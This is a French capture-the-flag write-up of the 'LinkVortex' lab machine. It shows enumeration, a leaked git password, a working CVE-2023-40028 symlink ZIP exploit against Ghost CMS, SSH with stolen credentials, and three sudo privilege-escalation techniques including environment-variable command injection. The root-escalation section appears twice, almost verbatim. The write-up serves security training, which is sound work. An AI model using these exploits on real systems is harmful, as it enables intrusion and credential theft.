![Cover](cover.png)

### 1. External Enumeration & Service Scanning

Ma reconnaissance commence par un scan **Nmap** agressif pour identifier les ports ouverts et les services associés sur la cible `10.10.11.47`.

```bash
# Scan rapide des 65535 ports
nmap -p- --min-rate 10000 10.10.11.47

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.47
```

Le scan révèle deux services standards :
*   **Port 22 (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **Port 80 (HTTP)** : Serveur Apache. La réponse HTTP indique une redirection vers `http://linkvortex.htb/`.

L'absence de version précise pour Apache et la présence de directives de sécurité suggèrent un durcissement (Hardening) du serveur. J'ajoute immédiatement l'entrée dans mon fichier `/etc/hosts`.

### 2. Subdomain Fuzzing & Virtual Host Discovery

Le serveur utilise du **Host-based routing**. Je lance une énumération de sous-domaines avec **ffuf** pour découvrir des environnements de développement ou des interfaces cachées.

```bash
ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Le fuzzing identifie `dev.linkvortex.htb`. Après avoir mis à jour mon `/etc/hosts`, un nouveau scan **Nmap** sur ce sous-domaine révèle une information critique : un **Git repository** exposé.

> **Schéma Mental :**
> L'attaquant passe d'une IP nue à un nom de domaine, puis utilise le fuzzing de **Vhosts** pour trouver un environnement de `dev`. Souvent, ces environnements sont moins sécurisés et exposent des métadonnées comme le dossier `.git`, permettant de reconstruire le code source.

### 3. Exploitation du Git Leak & Credential Harvesting

Le répertoire `.git` est accessible publiquement. J'utilise **git-dumper** pour récupérer l'intégralité de l'historique et des fichiers du projet.

```bash
git-dumper http://dev.linkvortex.htb source/
cd source/
git status
```

L'analyse des modifications en attente (`git diff --cached`) dans le fichier `ghost/core/test/regression/api/admin/authentication.test.js` révèle un changement de mot de passe en clair dans un test unitaire :
*   **Password** : `OctopiFociPilfer45`

Bien que les identifiants par défaut du test ne fonctionnent pas, je tente une connexion sur l'instance **Ghost CMS** de `linkvortex.htb` avec l'adresse `admin@linkvortex.htb`. L'accès est validé, me donnant un accès **Authenticated** au panel d'administration.

### 4. Vecteur d'Entrée : CVE-2023-40028 (Ghost Arbitrary File Read)

L'instance tourne sous **Ghost 5.58**. Cette version est vulnérable à la **CVE-2023-40028**, une faille permettant de lire des fichiers arbitraires via l'upload d'archives ZIP contenant des **Symlinks**.

> **Schéma Mental :**
> Le CMS Ghost traite les fichiers ZIP importés pour la base de données ou les images. Si le moteur de décompression ne vérifie pas la présence de liens symboliques, un attaquant peut créer un lien pointant vers un fichier sensible du système (ex: `/etc/passwd`). Lors de l'accès au fichier via le serveur web, Ghost suit le lien et sert le contenu du fichier ciblé.

#### Création du Payload (Manual POC)
Je crée une archive ZIP contenant un lien symbolique pointant vers le fichier de configuration de Ghost.

```bash
# Création du lien symbolique
ln -s /var/lib/ghost/config.production.json content/images/exploit.png

# Création de l'archive en préservant les liens symboliques (-y)
zip -y -r poc.zip content/images/exploit.png
```

#### Exploitation via l'API Admin
J'utilise le cookie de session de mon navigateur pour uploader l'archive sur le endpoint `/ghost/api/admin/db`.

```bash
curl http://linkvortex.htb/ghost/api/admin/db \
-F "importfile=@poc.zip" \
-b 'ghost-admin-api-session=[COOKIE]'
```

Une fois l'upload réussi, je peux lire le fichier en accédant directement à l'URL de l'image "malveillante" :

```bash
curl -b 'ghost-admin-api-session=[COOKIE]' http://linkvortex.htb/content/images/exploit.png
```

### 5. Premier Shell : Accès SSH (Bob)

La lecture de `config.production.json` expose les paramètres **SMTP** du site, incluant des identifiants valides pour l'utilisateur `bob`.

```json
"auth": {
  "user": "bob@linkvortex.htb",
  "pass": "fibber-talented-worth"
}
```

Je teste ces credentials sur le service **SSH** et j'obtiens mon premier accès stable sur la machine.

```bash
ssh bob@linkvortex.htb
# Password: fibber-talented-worth
```

L'énumération locale peut maintenant commencer pour la phase d'élévation de privilèges.

---

### Mouvement Latéral : Accès SSH (Bob)

Après avoir exploité la vulnérabilité **Arbitrary File Read** (CVE-2023-40028) sur l'instance **Ghost CMS**, j'ai pu récupérer le fichier de configuration `/var/lib/ghost/config.production.json`. Ce fichier contient des identifiants en clair pour le service **SMTP**.

```bash
# Lecture du fichier de configuration via le script d'exploitation
python3 exploit.py http://linkvortex.htb admin@linkvortex.htb 'OctopiFociPilfer45' /var/lib/ghost/config.production.json
```

Le bloc `mail` révèle les credentials de l'utilisateur **bob** : `bob@linkvortex.htb` / `fibber-talented-worth`. Ces identifiants sont valides pour une session **SSH**.

```bash
# Connexion initiale
ssh bob@linkvortex.htb
```

---

### Énumération Interne & Post-Exploitation

Une fois sur la machine, ma première action est de vérifier les privilèges **Sudo**.

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

**Points critiques identifiés :**
1.  **Privilège Sudo** : Je peux exécuter `/opt/ghost/clean_symlink.sh` en tant que **root** sans mot de passe, à condition que l'argument se termine par `.png`.
2.  **Environment Variable** : La variable d'environnement `CHECK_CONTENT` est préservée lors de l'exécution via `env_keep`.

---

### Analyse du Script `clean_symlink.sh`

Le script est conçu pour nettoyer les **Symlinks** malveillants en les déplaçant vers un répertoire de quarantaine (`/var/quarantined`).

> **Schéma Mental : Logique du Script**
> 1. Vérifie si l'argument est un **Symlink** (`test -L`).
> 2. Vérifie si la cible du lien contient "etc" ou "root" via `grep`.
> 3. Si "safe" : Déplace le lien vers `/var/quarantined/`.
> 4. Si `CHECK_CONTENT` est `true` : Exécute `cat` sur le fichier déplacé.

---

### Escalade de Privilèges (Root)

J'ai identifié trois vecteurs d'attaque pour détourner ce script et obtenir les privilèges **root**.

#### Vecteur 1 : Double Symlinks (Contournement de Logique)
Le script utilise `readlink` pour vérifier la cible, mais il ne le fait pas de manière récursive. Si je pointe un **Symlink** vers un autre **Symlink**, le `grep` ne verra que le chemin intermédiaire.

```bash
# Création de la chaîne de liens
ln -s /root/root.txt /home/bob/.cache/link_b
ln -s /home/bob/.cache/link_b /home/bob/.cache/exploit.png

# Exécution avec CHECK_CONTENT pour lire le flag
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/.cache/exploit.png
```

#### Vecteur 2 : TOCTOU (Race Condition)
Il existe un délai entre le moment où le script vérifie la cible du lien (**Time-of-Check**) et le moment où il affiche son contenu (**Time-of-Use**). Je peux exploiter cette fenêtre pour modifier la cible du lien.

```bash
# Terminal 1 : Boucle de remplacement rapide
while true; do ln -sf /root/root.txt /var/quarantined/race.png; done

# Terminal 2 : Exécution du script sur un lien initialement "safe"
ln -s /etc/hostname /dev/shm/race.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /dev/shm/race.png
```

#### Vecteur 3 : Injection de Commande via Variable d'Environnement
C'est la méthode la plus directe. Le script contient la ligne suivante : `if $CHECK_CONTENT; then`. Ici, `$CHECK_CONTENT` n'est pas évalué comme un booléen mais exécuté comme une commande. Comme je contrôle cette variable et qu'elle est conservée par **sudo**, je peux injecter un shell.

> **Schéma Mental : Injection de Variable**
> Le script exécute littéralement la valeur de la variable. Si `CHECK_CONTENT="bash"`, le script exécute `bash` avec les privilèges **root** au sein de la condition `if`.

```bash
# Préparation d'un symlink factice pour passer le premier test -L
ln -s /etc/hostname /tmp/trigger.png

# Élévation de privilèges
CHECK_CONTENT="bash" sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/trigger.png
```

Une fois le shell **root** obtenu, je peux stabiliser le terminal et lire les preuves finales.

```bash
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:~# cat /root/root.txt
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial établi en tant que **bob**, l'objectif est d'identifier des vecteurs d'escalade vers l'utilisateur **root**. L'énumération standard des privilèges **Sudo** révèle une configuration intéressante.

#### Énumération des privilèges Sudo

Je commence par vérifier les droits de **bob** avec `sudo -l` :

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Le script `/opt/ghost/clean_symlink.sh` peut être exécuté avec les privilèges de n'importe quel utilisateur sans mot de passe, à condition que l'argument se termine par `.png`. De plus, la variable d'environnement `CHECK_CONTENT` est préservée via `env_keep`.

#### Analyse du script clean_symlink.sh

Le script effectue les opérations suivantes :
1. Il vérifie si l'argument est un **Symbolic Link** (`test -L`).
2. Il extrait la cible du lien via `readlink`.
3. Il utilise `grep` pour bloquer les cibles contenant les chaînes "etc" ou "root".
4. Si le test réussit, il déplace le lien vers `/var/quarantined/`.
5. Si `CHECK_CONTENT` est évalué à **true**, il exécute `cat` sur le fichier déplacé.

> **Schéma Mental :** La vulnérabilité réside dans la confiance accordée à la structure du lien symbolique et dans l'évaluation non sécurisée de la variable d'environnement. Le script tente de filtrer le contenu par une liste noire (Blacklist) de mots-clés, ce qui est structurellement fragile.

#### Vecteur 1 : Double Symlinks (Bypass de filtre)

Le script vérifie uniquement la cible directe du premier lien. Si je crée une chaîne de liens, le `readlink` initial ne verra pas la destination finale interdite.

```bash
# Création de la chaîne : a.png -> b -> /root/root.txt
ln -s /root/root.txt /home/bob/.cache/b
ln -s /home/bob/.cache/b /home/bob/.cache/a.png

# Exécution avec CHECK_CONTENT pour lire le flag
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
```

#### Vecteur 2 : TOCTOU (Time-of-Check to Time-of-Use)

Il existe un délai entre le moment où le script vérifie la cible du lien et le moment où il exécute `cat`. Je peux exploiter cette **Race Condition**.

```bash
# Terminal 1 : Boucle infinie pour remplacer le lien après le déplacement
while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done

# Terminal 2 : Création d'un lien légitime et exécution du script
ln -s /home/bob/.bashrc /dev/shm/toctou.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /dev/shm/toctou.png
```

#### Vecteur 3 : Arbitrary Command Execution (Vecteur Optimal)

La faille la plus critique se situe dans l'instruction `if $CHECK_CONTENT; then`. En Bash, si une variable est placée directement après un `if`, elle est exécutée comme une commande. Je peux donc injecter `bash` pour obtenir un shell **root** instantanément.

```bash
# Création d'un lien symbolique quelconque pour passer le premier check
ln -s /tmp/dummy.png /tmp/exploit.png

# Injection de commande via la variable d'environnement
CHECK_CONTENT=bash sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/exploit.png
```

Une fois le shell obtenu, je peux stabiliser l'accès en lisant la **SSH Private Key** de root ou en lisant directement le flag :

```bash
root@linkvortex:~# cat /root/root.txt
0a2801b6************************
```

---

### Beyond Root : Analyse de la configuration Apache

Lors de la phase de reconnaissance, j'ai noté que le serveur **Apache** ne divulguait aucune version dans les en-têtes HTTP ou sur les pages d'erreur 404. L'analyse post-exploitation du fichier `/etc/apache2/sites-enabled/vhost.conf` confirme l'application de mesures de **Hardening**.

#### Directives de sécurité identifiées

Le fichier de configuration contient les directives suivantes :

```apache
ServerSignature Off
ServerTokens Prod
```

**Analyse technique :**
*   **ServerSignature Off** : Supprime la ligne de pied de page générée par le serveur sur les documents d'erreur (404, 403, etc.), empêchant ainsi l'exposition du nom d'hôte et de la version.
*   **ServerTokens Prod** : Modifie l'en-tête de réponse HTTP `Server`. Au lieu d'envoyer `Server: Apache/2.4.52 (Ubuntu)`, le serveur renvoie uniquement `Server: Apache`.

> **Schéma Mental :** Cette approche suit le principe de **Security through Obscurity**. Bien qu'elle ne corrige aucune vulnérabilité réelle, elle ralentit la phase d'énumération d'un attaquant en masquant la **Surface d'Attaque** précise (versions spécifiques de l'OS et du service).

Pour restaurer la visibilité totale lors de mes tests, j'ai modifié ces valeurs :
1. Commenter `ServerTokens Prod` permet de voir la version exacte dans les headers.
2. Commenter `ServerSignature Off` réactive le footer détaillé sur les pages 404.

Cette configuration est une bonne pratique standard pour limiter la fuite d'informations (Information Leakage) en environnement de production.